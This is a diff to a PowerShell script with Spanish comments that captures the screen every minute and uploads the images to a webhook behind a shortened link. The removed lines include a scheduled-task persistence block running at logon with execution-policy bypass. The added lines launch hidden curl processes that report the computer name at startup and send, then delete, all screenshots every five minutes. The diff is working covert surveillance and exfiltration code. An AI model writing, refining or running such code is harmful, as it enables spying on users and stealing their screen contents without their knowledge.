@@ -4,8 +4,8 @@ $hookurl = "https://bit.ly/web_chupakbras"
 # Define el intervalo de tiempo en segundos entre capturas de pantalla
 $seconds = 60 # Intervalo de captura de pantalla (1 minuto)
 
-# Define la cantidad de capturas por archivo ZIP
-$capturesPerZip = 20
+# Define el rango de tiempo en segundos para enviar las imágenes
+$sendInterval = 300 # 5 minutos
 
 # Variable para contar las capturas
 $counter = 0
@@ -23,20 +23,11 @@ function TakeScreenshot {
     
     # Incrementa el contador
     $counter++
-    
-    # Envía la captura de prueba si es la primera
-    if ($counter -eq 1) {
-        Write-Host "Enviando captura de prueba..."
-        Start-Sleep 1
-        curl.exe -F "file1=@$Filett" $hookurl
-    }
 }
 
-# Detectar URL de webhook acortada
-if ($hookurl.Ln -ne 121) {
-    Write-Host "URL de Webhook acortada detectada.."
-    $hookurl = (irm $hookurl).url
-}
+# Envía un mensaje al webhook al iniciar Windows
+Write-Host "Enviando mensaje al webhook..."
+Start-Process -FilePath 'curl.exe' -ArgumentList "-d '{\"message\":\"Computador encendido ($env:COMPUTERNAME)\"}' -H 'Content-Type: application/json' -X POST $hookurl" -NoNewWindow -WindowStyle Hidden
 
 # Obtiene la resolución de la pantalla
 $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
@@ -51,33 +42,19 @@ if (-not (Test-Path -Path $TempFolder)) {
     New-Item -ItemType Directory -Path $TempFolder | Out-Null
 }
 
-# Crea la tarea programada para ejecutar el script al iniciar sesión en Windows
-$TaskName = "Capturas de pantalla"
-$TaskDescription = "Tarea programada para ejecutar el script de captura de pantalla al iniciar sesión en Windows"
-$Trigger = New-ScheduledTaskTrigger -AtLogon
-$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File ""$MyInvocation.MyCommand.Definition"""
-Register-ScheduledTask -TaskName $TaskName -Description $TaskDescription -Trigger $Trigger -Action $Action -RunLevel Highest -Force
-
-# Realiza la captura de pantalla y envía la captura de prueba
-TakeScreenshot
-
-# Bucle principal para continuar capturando y enviando capturas de pantalla
+# Realiza la captura de pantalla y envía las capturas
 while ($true) {
     # Realiza la captura de pantalla
     TakeScreenshot
 
-    # Si se alcanza el límite de capturas por ZIP, crea y envía el archivo ZIP
-    if ($counter % $capturesPerZip -eq 0) {
-        $ZipFile = "$TempFolder\Screenshots_$counter.zip"
-        Add-Type -AssemblyName System.IO.Compression.FileSystem
-        [System.IO.Compression.ZipFile]::CreateFromDirectory($TempFolder, $ZipFile)
-
-        Write-Host "Enviando archivo ZIP..."
-        Start-Sleep 1
-        curl.exe -F "file1=@$ZipFile" $hookurl
-
-        # Elimina el archivo ZIP después de enviarlo
-        Remove-Item -Path $ZipFile -Force
+    # Si se alcanza el tiempo para enviar las imágenes, envía todas las capturas
+    if ($counter -gt 0 -and $counter % ($sendInterval / $seconds) -eq 0) {
+        Write-Host "Enviando imágenes..."
+        Get-ChildItem -Path $TempFolder -Filter "*.png" | ForEach-Object {
+            Start-Process -FilePath 'curl.exe' -ArgumentList "-F 'file1=@$($_.FullName)' $hookurl" -NoNewWindow -WindowStyle Hidden
+            Remove-Item -Path $_.FullName -Force
+        }
+        $counter = 0
     }
 
     # Espera el tiempo definido antes de tomar la siguiente captura de pantalla
